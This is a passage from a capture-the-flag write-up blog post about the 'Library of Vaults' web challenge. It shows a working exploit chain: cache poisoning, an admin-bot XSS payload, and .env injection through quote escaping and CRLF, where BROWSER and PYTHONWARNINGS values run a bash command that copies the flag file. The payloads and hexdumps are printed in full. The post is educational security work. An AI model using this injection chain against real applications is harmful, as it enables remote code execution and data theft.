    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">set_key</span><span class="p">(</span><span class="n">ENVIRON_FILE</span><span class="p">,</span> <span class="s2">&#34;BACKUP_SERVER&#34;</span><span class="p">,</span> <span class="n">backup_server</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">set_key</span><span class="p">(</span><span class="n">ENVIRON_FILE</span><span class="p">,</span> <span class="s2">&#34;ARCHIVE_PATH&#34;</span><span class="p">,</span> <span class="n">archive_path</span><span class="p">)</span></span></span></code></pre></div></div>
<p>I was trying to send POST requests to see how the env is modified.</p>
<p>By default, the values were single-quoted, so we are interested in this:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">_single_quoted_value</span> <span class="o">=</span> <span class="n">make_regex</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;&#39;((?:</span><span class="se">\\</span><span class="s2">&#39;|[^&#39;])*)&#39;&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
<p>It matches a string that starts and ends with a single quote, and allows any characters inside it except an unescaped single quote, while explicitly allowing <strong>escaped single quotes (')</strong></p>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/chopper-one-piece.gif"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/chopper-one-piece.gif, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/chopper-one-piece.gif 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/chopper-one-piece.gif 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/chopper-one-piece.gif"
        title="chopper" /></p>
<hr>
<h1 id="i-know-i-talked-a-lot-and-its-a-lot-to-follow-but-you-can-read-that-part-again-its-important-for-what-comes-next"><strong>I know I talked a lot and its a lot to follow, but you can read that part again, its important for what comes next.</strong></h1>
<hr>
<h4 id="the-quote-escape-technique">The Quote Escape Technique</h4>
<p>The trick I used here is taking advantage of the fact that we can set two environment variables.</p>
<p>Since we have two variables, we have 4 single quotes:</p>
<ul>
<li>Opening single quote of the first variable</li>
<li>Closing single quote of the first variable</li>
<li>Opening single quote of the second variable</li>
<li>Closing single quote of the second variable</li>
</ul>
<p>So we can escape the closing quote of the first variable and use the opening quote of the second variable as the end of that first value.</p>
<p>Then we would define an unquoted variable. It will work, but there&rsquo;s one thing to add: in this current solution, the closing quote of the second variable will be added and it will ruin the newly created env variable. So we would just add a CRLF and random text to get rid of it.</p>
<p>With this payload I was able to sneak in one environment variable. I can just repeat the process to add another environment variable.</p>
<h4 id="analyzing-the-payload">Analyzing the Payload</h4>
<p>Here is the hexdump:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>00000000: 4241 434b 5550 5f53 4552 5645 523d 2761  BACKUP_SERVER=&#39;a
00000010: 5c27 0a41 5243 4849 5645 5f50 4154 483d  \&#39;.ARCHIVE_PATH=
00000020: 2779 5c27 0a42 524f 5753 4552 3d2f 6269  &#39;y\&#39;.BROWSER=/bi
00000030: 6e2f 6261 7368 202d 6320 2263 6174 2022  n/bash -c &#34;cat &#34;
00000040: 2f66 6c61 672e 7478 743e 2f61 7070 2f73  /flag.txt&gt;/app/s
00000050: 7461 7469 632f 7077 6c2e 7478 7422 2220  tatic/pwl.txt&#34;&#34; 
00000060: 262b 2325 730a 7927 0a42 4143 4b55 505f  &amp;+#%s.y&#39;.BACKUP_
00000070: 5345 5256 4552 3d27 615c 270a 4152 4348  SERVER=&#39;a\&#39;.ARCH
00000080: 4956 455f 5041 5448 3d27 795c 270d 0a50  IVE_PATH=&#39;y\&#39;..P
00000090: 5954 484f 4e57 4152 4e49 4e47 533d 616c  YTHONWARNINGS=al
000000a0: 6c3a 303a 616e 7469 6772 6176 6974 792e  l:0:antigravity.
000000b0: 783a 303a 300d 0a79 270a                 x:0:0..y&#39;.</code></pre></div>
<p>To better see this, I added some debugging print statements in the module code, especially in the <code>parse_binding</code> method:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">value</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Parsed key: </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s1">=</span><span class="si">{</span><span class="n">value</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;---&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Parsed key: </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s1">=</span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;---&#39;</span><span class="p">)</span></span></span></code></pre></div></div>
<p>The output is like this:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>Parsed key: BACKUP_SERVER
BACKUP_SERVER=b&#34;a&#39;\nARCHIVE_PATH=&#34;
python-dotenv could not parse statement starting at line 1
---
Parsed key: BROWSER
BROWSER=b&#39;/bin/bash -c &#34;cat &#34;/flag.txt&gt;/app/static/pwl.txt&#34;&#34; &amp;+#%s&#39;
---
Parsed key: y&#39;
y&#39;=None
---
Parsed key: BACKUP_SERVER
BACKUP_SERVER=b&#34;a&#39;\nARCHIVE_PATH=&#34;
python-dotenv could not parse statement starting at line 5
---
Parsed key: PYTHONWARNINGS
PYTHONWARNINGS=b&#39;all:0:antigravity.x:0:0&#39;
---
Parsed key: y&#39;
y&#39;=None
---</code></pre></div>
<p>The errors shown mean that the <code>BACKUP_SERVER</code> environment variable was not correctly parsed. After some more debugging, I found that this line was causing the problem:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">reader</span><span class="o">.</span><span class="n">read_regex</span><span class="p">(</span><span class="n">_end_of_line</span><span class="p">)</span></span></span></code></pre></div></div>
<p><strong>NOTE:</strong> It didn&rsquo;t find a newline to terminate the variable, so it must be added at the end. (I was already adding it without knowing its value xd until I debugged more after the CTF. Since in the CTF it was my first attempt to bypass with CRLF, I was sure I must add it. Now I understand why, actually.)</p>
<p>This part will be the first variable:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>00000000: 4241 434b 5550 5f53 4552 5645 523d 2761  BACKUP_SERVER=&#39;a
00000010: 5c27 0a41 5243 4849 5645 5f50 4154 483d  \&#39;.ARCHIVE_PATH=
00000020: 2779 5c27 0a42 524f 5753 4552 3d2f 6269  &#39;</code></pre></div>
<p>Our injected variable will be:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>                                                    BROWSER=/bi
00000030: 6e2f 6261 7368 202d 6320 2263 6174 2022  n/bash -c &#34;cat &#34;
00000040: 2f66 6c61 672e 7478 743e 2f61 7070 2f73  /flag.txt&gt;/app/s
00000050: 7461 7469 632f 7077 6c2e 7478 7422 2220  tatic/pwl.txt&#34;&#34; 
00000060: 262b 2325 730a 7927 0a42 4143 4b55 505f  &amp;+#%s</code></pre></div>
<p>Same for the second variable.</p>
<hr>
<h2 id="putting-it-all-together">Putting It All Together</h2>
<p>Now that everything is ready, let&rsquo;s get the flag</p>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/whitebeard.gif"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/whitebeard.gif, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/whitebeard.gif 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/whitebeard.gif 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/whitebeard.gif"
        title="whitebeard" /></p>
<hr>
<p>The full exploit chain became clear:</p>
<ol>
<li><strong>Cache Poisoning</strong> by sending a GET request to <code>/search?query=I%20BELEIVE%20IT%20DOESNT%20WORK</code> with my XSS payload in the body</li>
<li><strong>Trigger the bot</strong> via <code>/api/report</code></li>
<li><strong>The XSS executes</strong> in the admin&rsquo;s browser, which then:
<ul>
<li>Sends <code>action=reset_config</code> to reset the config to a clean state (to avoid any leftover data)</li>
<li>Injects the malicious <code>BROWSER</code> environment variable</li>
<li>Injects the <code>PYTHONWARNINGS</code> variable to trigger the antigravity import</li>
<li>Triggers the backup operation by sending <code>action=run_backup</code></li>
</ul>
</li>
<li><strong>The <code>.env</code> file gets overridden</strong> the way I want it, so I can inject any variables</li>
<li><strong>Python executes</strong> the backup script, the warning system imports antigravity, which launches our <code>BROWSER</code> command</li>
<li><strong>The flag</strong> gets written to <code>/app/static/pwl.txt</code></li>
<li>I fetch it and claim victory!</li>
</ol>
<h3 id="the-complete-xss-payload">The Complete XSS Payload</h3>
<p>The XSS payload looked like this:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-javascript">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:1337/panel&#39;</span><span class="p">,{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">credentials</span><span class="o">:</span><span class="s1">&#39;include&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span><span class="s1">&#39;action=reset_config&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">then</span><span class="p">(()=&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:1337/panel&#39;</span><span class="p">,{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">credentials</span><span class="o">:</span><span class="s1">&#39;include&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span><span class="s2">&#34;action=update_config&amp;backup_server=a\\&amp;archive_path=y&#39;%0d%0aBROWSER=/bin/bash%20-c%20\&#34;cat%20/flag.txt&gt;/app/static/pwl.txt\&#34;%20&amp;+#%%s%0d%0ay&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}))</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">then</span><span class="p">(()=&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:1337/panel&#39;</span><span class="p">,{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">credentials</span><span class="o">:</span><span class="s1">&#39;include&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span><span class="s2">&#34;action=update_config&amp;backup_server=a\\&amp;archive_path=y&#39;%0d%0aPYTHONWARNINGS=all:0:antigravity.x:0:0%0d%0ay&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}))</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">then</span><span class="p">(()=&gt;</span><span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="mi">2000</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nx">then</span><span class="p">(()=&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:1337/panel&#39;</span><span class="p">,{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">credentials</span><span class="o">:</span><span class="s1">&#39;include&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">body</span><span class="o">:</span><span class="s2">&#34;action=run_backup&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}))</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span></span></span></code></pre></div></div>
<hr>
<p>After triggering the exploit and waiting a few seconds for the bot to do its thing, I fetched <code>/static/pwl.txt</code> and there it was, the flag!</p>
<h2 id="flag-shellmatesc4ch3d_"><strong>FLAG: shellmates{c4ch3d_x55_dr1nk5cr5f&amp;_p01s0n3d_d0t3nv}</strong></h2>
<p>After all that and finally getting the flag, I felt only two things: a deep pride and a huge wave of relief!</p>
<hr>
<p><img
        class="lazyload"
        src="/blog/svg/loading.min.svg"
        data-src="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/zoro.gif"
        data-srcset="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/zoro.gif, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/zoro.gif 1.5x, /blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/zoro.gif 2x"
        data-sizes="auto"
        alt="/blog/images/bsides_algiers_2k25_web_library_of_vaults/gifs/zoro.gif"
        title="zoro resting" /></p>
<hr>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2025-12-21</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/blog/posts/bsides_algiers_2k25_web_library_of_vaults/" data-title="Bsides_algiers_2k25_web_library_of_vaults" data-via="Benhibafodhil" data-hashtags="ctf,web security,ctf"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/blog/posts/bsides_algiers_2k25_web_library_of_vaults/" data-title="Bsides_algiers_2k25_web_library_of_vaults"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/blog/posts/bsides_algiers_2k25_web_library_of_vaults/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/blog/posts/bsides_algiers_2k25_web_library_of_vaults/" data-title="Bsides_algiers_2k25_web_library_of_vaults"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/blog/posts/bsides_algiers_2k25_web_library_of_vaults/" data-title="Bsides_algiers_2k25_web_library_of_vaults"><i data-svg-src="/blog/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on " data-sharer="weibo" data-url="http://localhost:1313/blog/posts/bsides_algiers_2k25_web_library_of_vaults/" data-title="Bsides_algiers_2k25_web_library_of_vaults"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/blog/posts/bsides_algiers_2k25_web_library_of_vaults/" data-title="Bsides_algiers_2k25_web_library_of_vaults" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fbsides_algiers_2k25_web_library_of_vaults%2f&amp;text=Bsides_algiers_2k25_web_library_of_vaults" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/blog/tags/ctf/">Ctf</a>,&nbsp;<a href="/blog/tags/web-security/">Web Security</a>,&nbsp;<a href="/blog/tags/ctf/">Ctf</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/blog/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/blog/posts/htb_tombwatcher/" class="prev" rel="prev" title="HTB Machine Writeup &#34;TombWatcher&#34;"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HTB Machine Writeup "TombWatcher"</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/blog/" target="_blank">F0DH1L</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/blog/css/custom.css"><script src="/blog/lib/lazysizes/lazysizes.min.js"></script><script src="/blog/lib/clipboard/clipboard.min.js"></script><script src="/blog/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/blog/js/theme.min.js"></script></body>
</html>
